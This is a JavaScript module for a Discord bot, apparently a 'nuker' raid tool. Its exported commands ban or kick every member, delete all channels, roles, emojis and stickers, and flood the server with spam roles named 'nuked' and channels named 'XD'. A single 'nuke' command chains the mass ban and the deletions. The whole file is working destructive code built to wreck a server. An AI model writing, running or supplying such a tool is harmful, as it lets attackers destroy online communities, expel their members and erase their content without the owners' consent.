const {channel_send, command_error} = require('./functions.js')

function BanAll(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'BAN_MEMBERS'");
        let arrayOfIDs = ctx.message.guild.members.cache.map((user) => user.id);
        setTimeout(() => {
            for (let i = 0; i < arrayOfIDs.length; i++) {
                const user = arrayOfIDs[i];
                const member = ctx.message.guild.members.cache.get(user);
                if(member.bannable){
                    member.ban().catch((err) => { console.log("Error Found: " + err) }).then(() => { console.log(`${member.user.tag} was banned.`) });
                }
            }
        }, 2000);
    })
}

function KickAll(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'KICK_MEMBERS'");
        let arrayOfIDs = ctx.message.guild.members.cache.map((user) => user.id);
        setTimeout(() => {
            for (let i = 0; i < arrayOfIDs.length; i++) {
                const user = arrayOfIDs[i];
                const member = ctx.message.guild.members.cache.get(user);
                if(member.kickable){
                    member.kick().catch((err) => { console.log("Error Found: " + err) }).then(() => { console.log(`${member.user.tag} was kicked.`) });
                }
            }
        }, 2000);
    })
}

function DelAllRoles(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_ROLES'");
        ctx.message.guild.roles.cache.forEach((r) => {
            r.delete().catch((err) => { console.log("Error Found: " + err) })
        })
    });
}

function DelAllEmotes(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
        ctx.message.guild.emojis.cache.forEach((e) =>{
            if(e.deletable){
                e.delete().catch((err) => { console.log("Error Found: " + err) })
            }
        })
    });
}

function DelAllChannels(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_CHANNELS'");
        ctx.message.guild.channels.cache.forEach((ch) => {
            if(ch.deletable){
                ch.delete().catch((err) => { console.log("Error Found: " + err) })
            }
        })
        resolve();
    });
}

function DelAllStickers(ctx) {
    return new Promise((resolve, reject) => {
        if (!ctx.message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
        ctx.message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log("Error Found: " + err) }))
    });
}

function MassRoles(ctx, amount, roleName) {
    return new Promise((resolve, reject) => {
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (!ctx.message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_ROLES'");
        for (let i = 0; i <= amount; i++) {
            if (ctx.message.guild.roles.cache.size === 250) break;
            if (!roleName) {
                ctx.message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log("Error Found: " + err) })
            } else {
                ctx.message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log("Error Found: " + err) })
            }
        }
    })
}

function MassChannels(ctx, amount, channelName) {
    return new Promise((resolve, reject) => {
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (amount > 500) return reject("Amount Error: Max guild channel size is 500");
        if (!ctx.message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR")) return reject("Missing Permissions: 'MANAGE_CHANNELS'");
        for (let i = 0; i < amount; i++) {
            if (ctx.message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                ctx.message.guild.channels.create(`XD`, { type: "GUILD_TEXT" }).catch((err) => { console.log("Error Found: " + err) })
            } else {
                ctx.message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log("Error Found: " + err) })
            }
        }
        resolve();
    });
}

exports.nuke = async function nuke(ctx, args){
    try{
        BanAll(ctx)
        DelAllChannels(ctx)
        DelAllRoles(ctx)
        DelAllEmotes(ctx)
        DelAllStickers(ctx)
    }catch(e){
      console.log(e)
    }
}
exports.kickall = async function kickall(ctx, args){
    try{
        KickAll(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.banall = async function banall(ctx, args){
    try{
        BanAll(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.deleteallchannels = async function deleteallchannels(ctx, args){
    try{
        DelAllChannels(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.deleteallroles = async function deleteallroles(ctx, args){
    try{
        DelAllRoles(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.deleteallemotes = async function deleteallemotes(ctx, args){
    try{
        DelAllEmotes(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.deleteallstickers = async function deleteallstickers(ctx, args){
    try{
        DelAllStickers(ctx).catch((err) => {
            if(err) channel_send(ctx, err);
        });
    }catch(e){
      console.log(e)
    }
}
exports.masscreateroles = async function masscreateroles(ctx, args){
    try{
        if(args.length != 0){
            const amount = args[0]
            const roleName = args[1]
            MassRoles(ctx, amount, roleName).catch((err) => {
                if(err) channel_send(ctx, err);
            });
        }else{
            command_error(ctx, `${ctx.prefix}${ctx.command} (amount) [role name]`, null)
        }
    }catch(e){
      console.log(e)
    }
}
exports.masscreatechannel = async function masscreatechannel(ctx, args){
    try{
        if(args.length != 0){
            const amount = args[0]
            const channelName = args[1]
            MassChannels(ctx, amount, channelName).catch((err) => {
                if(err) channel_send(ctx, err);
            });
        }else{
            command_error(ctx, `${ctx.prefix}${ctx.command} (amount) [channel name]`, null)
        }
    }catch(e){
      console.log(e)
    }
}
